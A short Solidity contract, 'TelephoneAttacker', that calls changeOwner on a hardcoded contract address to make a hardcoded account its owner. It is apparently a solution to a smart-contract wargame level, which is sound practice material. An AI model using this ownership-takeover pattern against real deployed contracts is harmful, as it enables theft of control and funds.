// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "hardhat/console.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    function changeOwner() public {
        ITelephone(0xF1106c4d74f791f707427e12a0cBB2E856DaeC30).changeOwner(
            0x29F0d2316DD20c00dE2402Baa65947f442a158E3
        );
    }
}
